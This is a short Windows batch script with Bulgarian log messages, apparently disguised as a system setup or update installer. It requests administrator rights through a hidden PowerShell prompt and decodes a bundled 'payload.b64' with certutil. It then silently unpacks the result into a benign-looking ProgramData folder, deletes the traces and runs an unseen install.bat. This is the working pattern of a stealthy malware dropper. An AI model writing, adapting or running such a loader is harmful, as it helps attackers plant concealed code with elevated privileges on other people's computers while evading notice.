@echo off
chcp 65001 >nul
cd /d "%~dp0"
set "TARGET_DIR=C:\ProgramData\MySystemSetup"
set "LOG_FILE=%TARGET_DIR%\install_log.txt"
set "TEMP_ZIP=%TEMP%\update_%RANDOM%.zip"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1

echo =================================================== >> "%LOG_FILE%"
echo [+] Начало: %date% %time% >> "%LOG_FILE%"

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Нужни са админ права. Пренасочване... >> "%LOG_FILE%"
    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

echo [+] Админ права OK. >> "%LOG_FILE%"

if not exist "%~dp0payload.b64" (
    echo [!] Грешка: payload.b64 не е намерен! >> "%LOG_FILE%"
    exit /b 1
)

echo [+] Декодиране на payload.b64... >> "%LOG_FILE%"
certutil -decode "%~dp0payload.b64" "%TEMP_ZIP%" >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Грешка при certutil decode. >> "%LOG_FILE%"
    exit /b 1
)

echo [+] Разархивиране... >> "%LOG_FILE%"
powershell -NoProfile -WindowStyle Hidden -Command "Expand-Archive -LiteralPath '%TEMP_ZIP%' -DestinationPath '%TARGET_DIR%' -Force" >nul 2>&1

del "%TEMP_ZIP%" >nul 2>&1

cd /d "%TARGET_DIR%"
if exist "install.bat" (
    echo [+] Стартиране на install.bat... >> "%LOG_FILE%"
    call "install.bat" >> "%LOG_FILE%" 2>&1
) else (
    echo [!] install.bat не е намерен. >> "%LOG_FILE%"
    dir /b >> "%LOG_FILE%"
)

echo =================================================== >> "%LOG_FILE%"
exit /b 0